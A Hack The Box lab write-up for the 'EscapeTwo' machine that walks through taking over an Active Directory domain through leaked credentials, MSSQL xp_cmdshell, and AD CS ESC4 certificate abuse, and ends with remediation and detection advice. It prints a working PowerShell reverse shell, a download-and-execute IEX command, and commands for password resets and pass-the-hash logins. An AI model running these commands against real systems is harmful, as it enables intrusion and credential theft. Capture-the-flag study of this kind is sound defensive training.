# EscapeTwo — Hack The Box Write-up

## Enumeration

We begin with an Nmap scan against the target.

```bash
nmap -sC -sV -Pn 10.129.39.60
```

### Open Ports

```text
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  ncacn_http
636/tcp   open  ssl/ldap
1433/tcp  open  ms-sql-s
3268/tcp  open  ldap
3269/tcp  open  ssl/ldap
5985/tcp  open  http
```

The scan reveals several interesting services:

* Active Directory services (LDAP, Kerberos, SMB).
* Microsoft SQL Server running on port `1433`.
* WinRM available on port `5985`.

The domain information can also be extracted:

```text
Domain: sequel.htb
Hostname: DC01.sequel.htb
```

---

# Initial Access

## Enumerating SMB Shares

Browsing the available SMB shares reveals an HR department share containing an Excel spreadsheet.

```bash
impacket-smbclient sequel.htb/guest@10.129.39.60
```

Inside the share, we find `accounts.xlsx`.

The spreadsheet contains the following credentials:

| Email                                         | Username | Password         |
| --------------------------------------------- | -------- | ---------------- |
| [angela@sequel.htb](mailto:angela@sequel.htb) | angela   | 0fwz7Q4mSpurIt99 |
| [oscar@sequel.htb](mailto:oscar@sequel.htb)   | oscar    | 86LxLBMgEWaKUnBG |
| [kevin@sequel.htb](mailto:kevin@sequel.htb)   | kevin    | Md9Wlq1E5bZnVDVo |
| [sa@sequel.htb](mailto:sa@sequel.htb)         | sa       | MSSQLP@ssw0rd!   |

---

## Accessing MSSQL

The SQL administrator credentials work against the SQL Server.

```bash
impacket-mssqlclient sequel.htb/sa:'MSSQLP@ssw0rd!'@10.129.39.60
```

---

## Enabling `xp_cmdshell`

To execute operating-system commands through MSSQL, we enable `xp_cmdshell`.

```sql
EXEC sp_configure 'show advanced options',1;
RECONFIGURE;

EXEC sp_configure 'xp_cmdshell',1;
RECONFIGURE;
```

---

## Obtaining a Reverse Shell

Create a PowerShell reverse shell named `s.ps1`.

```powershell
$c = New-Object System.Net.Sockets.TCPClient('10.10.17.8',4444);
$s = $c.GetStream();
[byte[]]$b = 0..65535|%{0};

while(($i = $s.Read($b,0,$b.Length)) -ne 0)
{
    $d = (New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);
    $sb = (iex $d 2>&1 | Out-String);
    $sb2 = $sb + 'PS ' + (pwd).Path + '> ';
    $sbt = ([text.encoding]::ASCII).GetBytes($sb2);
    $s.Write($sbt,0,$sbt.Length);
    $s.Flush();
}

$c.Close();
```

Host the file:

```bash
python -m http.server 80
```

Start a listener:

```bash
nc -nlvp 4444
```

Execute the payload from MSSQL:

```sql
EXEC xp_cmdshell 'powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(''http://10.10.17.8/s.ps1'')"';
```

A shell is obtained as the SQL service account.

---

# Privilege Escalation

## Discovering Credentials

While enumerating the system, we find a SQL installation configuration file.

```powershell
type C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI
```

The file contains:

```text
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
```

---

## Password Reuse

The discovered password is reused across the domain.

Testing it against domain users reveals valid credentials for `ryan`.

```bash
evil-winrm -i 10.129.39.60 -u ryan -p 'WqSZAF6CysDQbGb3'
```

---

# Active Directory Enumeration

Using BloodHound, we collect domain information.

```bash
bloodhound-python \
-u 'ryan' \
-p 'WqSZAF6CysDQbGb3' \
-d sequel.htb \
-dc sequel.htb \
-ns 10.129.39.60 \
-c All
```

Start BloodHound:

```bash
bloodhound-start
```

Import the generated JSON files and mark `ryan` as owned.

Searching for attack paths reveals that:

```text
ryan → WriteOwner → ca_svc
```

This misconfiguration leads to an AD CS escalation path.

---

# Compromising `ca_svc`

## Taking Ownership

First, take ownership of the `ca_svc` account.

```bash
bloodyAD --host 10.129.39.60 \
-d sequel.htb \
-u ryan \
-p 'WqSZAF6CysDQbGb3' \
set owner ca_svc ryan
```

Grant full control:

```bash
bloodyAD --host 10.129.39.60 \
-d sequel.htb \
-u ryan \
-p 'WqSZAF6CysDQbGb3' \
add genericAll ca_svc ryan
```

Reset the password:

```bash
bloodyAD --host 10.129.39.60 \
-d sequel.htb \
-u ryan \
-p 'WqSZAF6CysDQbGb3' \
set password ca_svc 'Password123!'
```

---

# Enumerating AD CS

Now enumerate certificate templates.

```bash
certipy-ad find \
-u 'ca_svc@sequel.htb' \
-p 'Password123!' \
-dc-ip 10.129.39.60 \
-stdout
```

The template `DunderMifflinAuthentication` stands out.

```text
Template Name: DunderMifflinAuthentication

User Enrollable Principals:
    SEQUEL.HTB\Cert Publishers

User ACL Principals:
    SEQUEL.HTB\Cert Publishers
```

The compromised account `ca_svc` belongs to the `Cert Publishers` group, which has dangerous permissions over the certificate template.

---

# Exploiting ESC4

Request a certificate on behalf of the domain administrator.

```bash
certipy-ad req \
-username 'ca_svc@sequel.htb' \
-p 'Password123!' \
-ca sequel-DC01-CA \
-template DunderMifflinAuthentication \
-target dc01.sequel.htb \
-dc-ip 10.129.39.60 \
-upn administrator@sequel.htb
```

This generates:

```text
administrator.pfx
```

Authenticate using the certificate:

```bash
certipy-ad auth \
-pfx administrator.pfx \
-dc-ip 10.129.39.60
```

Certipy returns the administrator NTLM hash.

---

# Administrator Access

Use the recovered hash to authenticate through WinRM.

```bash
evil-winrm \
-i 10.129.39.60 \
-u Administrator \
-H '7a8d4e04986afa8ed4060f75e5a0b3ff'
```

We now have full administrative access to the domain controller.

---

# Attack Path Summary

```text
SMB Share Enumeration
        ↓
Leaked MSSQL Credentials
        ↓
MSSQL Access (sa)
        ↓
xp_cmdshell
        ↓
Reverse Shell
        ↓
SQL Configuration Leak
        ↓
Password Reuse → ryan
        ↓
BloodHound Enumeration
        ↓
WriteOwner on ca_svc
        ↓
Take Ownership
        ↓
Reset Password
        ↓
AD CS Enumeration
        ↓
ESC4 Abuse
        ↓
Administrator Certificate
        ↓
Domain Administrator
```
# Key Learnings

* Sensitive files stored in SMB shares should never contain plaintext credentials. Even a single leaked password can compromise an entire environment.

* Microsoft SQL Server can become an effective pivot point when administrative accounts such as `sa` are exposed.

* The `xp_cmdshell` feature significantly increases the attack surface by allowing SQL Server users to execute operating-system commands.

* Configuration and installation files often contain hardcoded credentials and should always be included in post-exploitation enumeration.

* Password reuse across service accounts and domain users can transform a local compromise into domain-wide access.

* Graph-based enumeration tools such as BloodHound are extremely useful for identifying hidden privilege escalation paths in Active Directory.

* Permissions such as `WriteOwner`, `WriteDACL`, and `GenericAll` can be just as dangerous as direct administrative privileges.

* Certificate Services misconfigurations may create unexpected attack paths. In this case, control over the `ca_svc` account allowed abuse of certificate template permissions to impersonate the domain administrator.

* Membership in groups like `Cert Publishers` should be carefully reviewed, especially when certificate templates grant enrollment or modification rights.

* Active Directory Certificate Services (AD CS) is a Tier-0 asset and should be protected with the same level of security as domain controllers.

---

# Remediation

## Secure SMB Shares

* Remove sensitive files containing credentials from network shares.
* Apply the principle of least privilege to all SMB shares.
* Continuously audit shared folders for confidential information.

---

## Protect SQL Server

* Disable the `sa` account whenever possible or enforce strong, unique passwords.
* Restrict access to SQL Server to authorized hosts only.
* Disable `xp_cmdshell` unless it is explicitly required.

```sql
EXEC sp_configure 'xp_cmdshell', 0;
RECONFIGURE;
```

* Periodically review SQL Server permissions and service account configurations.

---

## Eliminate Password Reuse

* Enforce unique passwords for users and service accounts.
* Implement a password management solution for privileged credentials.
* Rotate service account passwords regularly.

---

## Harden Active Directory Permissions

* Regularly audit delegated permissions such as:

  * `WriteOwner`
  * `WriteDACL`
  * `GenericAll`
  * `GenericWrite`

* Remove unnecessary privileges from low-privileged users.

* Continuously monitor changes to ownership and ACLs on sensitive objects.

---

## Secure Active Directory Certificate Services

* Audit all certificate templates and remove unnecessary enrollment permissions.

* Restrict access to privileged templates and administrative groups such as:

  * Domain Admins
  * Enterprise Admins
  * Cert Publishers

* Remove template permissions that allow non-administrative accounts to:

  * Modify certificate templates.
  * Change ACLs.
  * Enroll on behalf of other users.

* Monitor certificate enrollment events and template modifications.

* Regularly assess the environment for AD CS misconfigurations using tools such as:

```bash
certipy-ad find -u USER -p PASSWORD -dc-ip DC_IP -stdout
```

---

## Monitoring and Detection

Organizations should monitor for:

* Execution of `xp_cmdshell`.
* Password resets involving service accounts.
* Changes to object ownership and ACLs.
* Certificate template modifications.
* Unusual certificate requests targeting privileged users.
* Authentication using newly issued certificates.
* BloodHound- or SharpHound-like collection activity.
